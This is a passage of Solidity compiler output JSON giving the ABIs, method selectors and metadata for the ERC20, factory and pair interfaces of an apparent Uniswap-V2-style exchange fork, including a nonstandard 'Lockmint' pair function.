					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/IERC20.sol\":{\"keccak256\":\"0xa45dab2f2a6e81dff31d7f62a0b0513ae09f7f01ee22d0970e2b532e2b14fad8\",\"urls\":[\"bzz-raw://5b5177e85ae0239a5d633ca2d83652b0fc63622f0bc317a3d32a3661f50d7537\",\"dweb:/ipfs/QmdV9Jp5icxxC3SYVVuwQTKXMcWicDToahxUxdkFCJC4M9\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/IFactory.sol": {
				"IFactory": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "token0",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "token1",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "pair",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "PairCreated",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "INIT_CODE_PAIR_HASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "allPairs",
							"outputs": [
								{
									"internalType": "address",
									"name": "pair",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "allPairsLength",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								}
							],
							"name": "createPair",
							"outputs": [
								{
									"internalType": "address",
									"name": "pair",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "feeTo",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "feeToSetter",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								}
							],
							"name": "getPair",
							"outputs": [
								{
									"internalType": "address",
									"name": "pair",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "setFeeTo",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "setFeeToSetter",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"INIT_CODE_PAIR_HASH()": "5855a25a",
							"allPairs(uint256)": "1e3dd18b",
							"allPairsLength()": "574f2ba3",
							"createPair(address,address)": "c9c65396",
							"feeTo()": "017e7e58",
							"feeToSetter()": "094b7415",
							"getPair(address,address)": "e6a43905",
							"setFeeTo(address)": "f46901ed",
							"setFeeToSetter(address)": "a2e74af6"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token0\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token1\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"PairCreated\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"INIT_CODE_PAIR_HASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"allPairs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"allPairsLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"}],\"name\":\"createPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"feeToSetter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"}],\"name\":\"getPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"setFeeTo\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"setFeeToSetter\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/IFactory.sol\":\"IFactory\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/IFactory.sol\":{\"keccak256\":\"0x69d7f0c32f305449132b97119efc9d382c41c027f7739e312fdf3ca6b0bfc64d\",\"urls\":[\"bzz-raw://63280eb6f4eef4de9934869aee43278c3c5d48255b6c2ed9e10e6e4a136aae0b\",\"dweb:/ipfs/QmazKfJnm2PcDVZjBYLAZPyDrmPSmEnuurAvc7mbTKymAj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/IPair.sol": {
				"IPair": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Swap",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve0",
									"type": "uint112"
								},
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve1",
									"type": "uint112"
								}
							],
							"name": "Sync",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Lockmint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "MINIMUM_LIQUIDITY",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "getReserves",
							"outputs": [
								{
									"internalType": "uint112",
									"name": "reserve0",
									"type": "uint112"
								},
								{
									"internalType": "uint112",
									"name": "reserve1",
									"type": "uint112"
								},
								{
									"internalType": "uint32",
									"name": "blockTimestampLast",
									"type": "uint32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "initialize",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "kLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price0CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price1CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "skim",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "sync",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"Lockmint(address)": "dcbbb373",
							"MINIMUM_LIQUIDITY()": "ba9a7a56",
							"PERMIT_TYPEHASH()": "30adf81f",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"burn(address)": "89afcb44",
							"decimals()": "313ce567",
							"factory()": "c45a0155",
							"getReserves()": "0902f1ac",
							"initialize(address,address,uint256)": "1794bb3c",
							"kLast()": "7464fc3d",
							"mint(address)": "6a627842",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"price0CumulativeLast()": "5909c0d5",
							"price1CumulativeLast()": "5a3d5493",
							"skim(address)": "bc25cf77",
							"swap(uint256,uint256,address,bytes)": "022c0d9f",
							"symbol()": "95d89b41",
							"sync()": "fff6cae9",
							"token0()": "0dfe1681",
							"token1()": "d21220a7",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve0\",\"type\":\"uint112\"},{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve1\",\"type\":\"uint112\"}],\"name\":\"Sync\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Lockmint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MINIMUM_LIQUIDITY\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getReserves\",\"outputs\":[{\"internalType\":\"uint112\",\"name\":\"reserve0\",\"type\":\"uint112\"},{\"internalType\":\"uint112\",\"name\":\"reserve1\",\"type\":\"uint112\"},{\"internalType\":\"uint32\",\"name\":\"blockTimestampLast\",\"type\":\"uint32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"initialize\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"kLast\",\"outpu